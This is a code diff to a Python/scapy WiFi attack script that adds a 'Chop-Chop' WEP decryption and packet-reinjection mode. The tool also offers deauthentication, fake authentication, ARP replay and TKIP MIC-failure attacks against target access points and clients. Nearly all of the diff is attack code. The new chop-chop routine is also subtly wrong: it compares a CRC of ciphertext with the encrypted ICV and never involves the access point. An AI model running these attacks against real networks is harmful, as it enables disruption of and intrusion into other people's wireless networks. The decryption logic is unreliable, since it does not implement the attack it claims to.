@@ -8,8 +8,10 @@ import threading
 from scapy.all import *
 from scapy.layers.dot11 import *
 from scapy.layers.l2 import ARP, Ether
+import binascii
+import zlib
 
-# ================== Terminal Colors and Utilities ==================
+# ========== Terminal Colors and Utilities ==========
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -329,15 +331,62 @@ def send_mic_failure(iface, bssid, delay, client_mac=None):
         print(f"[*] MIC Failure rámec odeslán na {bssid}")
         time.sleep(delay)
 
+# ================== CHOP-CHOP ATTACK (from chopchop.py) ==================
+def get_wep_packet(interface, bssid):
+    print(f"[*] Sniffing for WEP packets from BSSID {bssid}...")
+    def filter_pkt(pkt):
+        return (
+            pkt.haslayer(Dot11) and
+            pkt.haslayer(Dot11WEP) and
+            pkt.addr2 == bssid and
+            pkt.type == 2
+        )
+    pkt = sniff(iface=interface, lfilter=filter_pkt, count=1)[0]
+    print("[+] Captured one WEP-encrypted data packet.")
+    return pkt
+
+def decrypt_crc(pkt, attacker_mac):
+    wep = pkt[Dot11WEP]
+    iv = wep.iv
+    key = bytes([int(iv >> 16), int((iv >> 8) & 0xff), int(iv & 0xff)])
+    encrypted_data = wep.wepdata
+    icv = wep.icv.to_bytes(4, byteorder="little")
+
+    print("[*] Starting Chop-Chop attack on packet...")
+    known = b""
+    for i in range(len(encrypted_data)-1):
+        for guess in range(256):
+            test_byte = bytes([encrypted_data[-(i+1)] ^ guess ^ known[-1] if known else guess])
+            test_frame = encrypted_data[:-1-i] + test_byte[::-1] + known[::-1]
+            test_crc = zlib.crc32(test_frame).to_bytes(4, byteorder="little")
+            if test_crc == icv:
+                known = test_byte + known
+                print(f"[+] Found byte {i+1}: {test_byte.hex()} (total: {known.hex()})")
+                break
+    plaintext = encrypted_data[:-len(known)] + known
+    print(f"[+] Decryption successful. Decrypted payload: {plaintext.hex()}")
+    return plaintext
+
+def reinject_packet(original_pkt, decrypted_data, attacker_mac, iface):
+    print("[*] Reinjecting decrypted packet...")
+    new_pkt = RadioTap()/Dot11(
+        type=2, subtype=0,
+        addr1=original_pkt.addr1,
+        addr2=attacker_mac,
+        addr3=original_pkt.addr3
+    )/LLC()/SNAP()/Raw(load=decrypted_data)
+    sendp(new_pkt, iface=iface, count=3, inter=0.1)
+    print("[+] Packet reinjected.")
+
 # ================== Argument Parsing and Main ==================
 def parse_args():
     parser = argparse.ArgumentParser(description="Advanced WiFi attacks tool for educational use (Linux only)")
     parser.add_argument("--deauth", action='store_true', help="Perform Deauth attack")
     parser.add_argument("-n", type=int, default=10, help="Number of packets to send (-1 for infinite)")
-    parser.add_argument("-a", metavar="AP_MAC", help="MAC address of target AP")
+    parser.add_argument("-a", metavar="BSSID", help="MAC address of target AP (also used for Chop-Chop and other attacks)")
     parser.add_argument("-c", metavar="CLIENT_MAC", help="Target client MAC address (optional for deauth)")
     parser.add_argument("--fakeauth", action='store_true', help="Perform Fake Authentication attack")
-    parser.add_argument("-m", metavar="YOUR_MAC", help="Your MAC address (required for fakeauth and arpreplay)")
+    parser.add_argument("-m", metavar="YOUR_MAC", help="Your MAC address (required for fakeauth and arpreplay and chopchop)")
     parser.add_argument("--arpreplay", action='store_true', help="Perform ARP Replay attack")
     parser.add_argument("-b", metavar="AP_MAC", help="MAC address of target AP (required for arpreplay)")
     parser.add_argument("-r", "--pcap", help="PCAP file with ARP request packet to replay (required for arpreplay)")
@@ -347,6 +396,7 @@ def parse_args():
     parser.add_argument("--tkip", action="store_true", help="Spustí TKIP MIC Failure exploit")
     parser.add_argument("--delay", type=float, default=1.0, help="Zpoždění mezi rámci (s) [for --tkip]")
     parser.add_argument("--client-mac", help="Klientská MAC adresa (fake) [for --tkip]")
+    parser.add_argument("--chop-chop", action="store_true", help="Enable Chop-Chop Attack")
     parser.add_argument("interface", help="Wireless interface in monitor mode")
 
     try:
@@ -357,10 +407,10 @@ def parse_args():
 
     if args.deauth:
         if not args.a:
-            parser.error("Deauth attack requires -a <AP_MAC>")
+            parser.error("Deauth attack requires -a <BSSID>")
     if args.fakeauth:
         if not args.a or not args.m:
-            parser.error("Fakeauth requires -a <AP_MAC> and -m <Your MAC>")
+            parser.error("Fakeauth requires -a <BSSID> and -m <Your MAC>")
     if args.arpreplay:
         if not args.b or not args.m or not args.pcap:
             parser.error("ARPreplay requires -b <AP_MAC>, -m <Your MAC>, and -r <PCAP file>")
@@ -370,8 +420,11 @@ def parse_args():
     if args.tkip:
         if not args.a:
             parser.error("TKIP attack requires -a <BSSID>")
-    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip):
-        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip)")
+    if args.chop_chop:
+        if not args.a or not args.m:
+            parser.error("Chop-Chop requires -a <BSSID> and -m <Your MAC>")
+    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip or args.chop_chop):
+        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip, --chop-chop)")
 
     return args
 
@@ -396,6 +449,10 @@ def main():
                 send_mic_failure(args.interface, args.a.lower(), args.delay, args.client_mac)
             except KeyboardInterrupt:
                 print("\n[!] Ukončeno uživatelem.")
+        elif args.chop_chop:
+            pkt = get_wep_packet(args.interface, args.a)
+            decrypted = decrypt_crc(pkt, args.m)
+            reinject_packet(pkt, decrypted, args.m, args.interface)
         else:
             print_error("No valid attack selected")
     except Exception as e:
